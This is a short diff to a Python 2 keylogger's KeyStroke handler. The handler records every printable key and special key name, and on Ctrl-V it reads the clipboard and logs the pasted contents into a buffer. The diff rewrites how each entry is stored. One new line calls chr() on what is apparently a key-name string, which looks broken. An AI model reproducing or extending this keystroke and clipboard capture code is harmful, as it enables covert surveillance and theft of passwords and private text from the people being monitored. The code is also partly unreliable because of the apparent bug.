@@ -60,7 +60,7 @@ def KeyStroke(event):
     #if they pressed a standard key
     if event.Ascii > 32 and event.Ascii <127:
         print chr(event.Ascii)
-        key_buffer.append(event.Ascii)
+        key_buffer.append(chr(event.Ascii))
         
     else:
         #if ctrl-v, get the value on clipboard
@@ -70,11 +70,11 @@ def KeyStroke(event):
             win32clipboard.CloseClipboard()
             
             print "[PASTE] - %s" %(pasted_value)
-            key_buffer.append(pasted_values)
+            key_buffer.append("[PASTE] - %s" %(pasted_value))
             
         else:
             print "[%s]" %event.Key
-            key_buffer.append(event.Key)
+            key_buffer.append(chr(event.Key))
            
    
                 
